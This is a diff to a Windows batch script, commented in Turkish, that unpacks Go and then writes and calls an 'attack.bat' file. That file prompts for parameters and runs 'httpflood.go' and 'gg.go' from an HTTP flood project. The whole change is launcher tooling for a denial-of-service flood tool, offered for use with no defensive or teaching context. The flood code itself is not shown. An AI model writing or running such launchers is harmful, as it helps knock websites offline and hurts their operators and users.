@@ -15,14 +15,16 @@ echo == Go dil dosyaları çıkarılıyor... ==
 REM 7-Zip kullanarak Go'yu çıkar
 "C:\Program Files\7-Zip\7z.exe" x %USERPROFILE%\gol.zip -o%USERPROFILE%
 
-REM Kullanıcıdan parametre girişi al
-set /p httpflood_params="httpflood için parametreleri girin: "
-set /p gg_params="gg için parametreleri girin: "
+REM attack.bat dosyasını oluştur
+echo @echo off > %USERPROFILE%\attack.bat
+echo set /p httpflood_params="httpflood için parametreleri girin: " >> %USERPROFILE%\attack.bat
+echo set /p gg_params="gg için parametreleri girin: " >> %USERPROFILE%\attack.bat
+echo "%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-main\httpflood.go" %%httpflood_params%% >> %USERPROFILE%\attack.bat
+echo "%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-main\gg.go" %%gg_params%% >> %USERPROFILE%\attack.bat
 
-echo == Go dosyaları çalıştırılıyor... ==
-REM Kullanıcıdan alınan parametrelerle Go dosyalarını çalıştır
-"%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-master\httpflood.go" %httpflood_params%
-"%USERPROFILE%\go\bin\go.exe" run "%USERPROFILE%\flo\golang-httpflood-master\gg.go" %gg_params%
+echo == attack.bat dosyası çalıştırılıyor... ==
+REM attack.bat dosyasını çağır
+call %USERPROFILE%\attack.bat
 
 echo == İşlem tamamlandı! ==
 pause
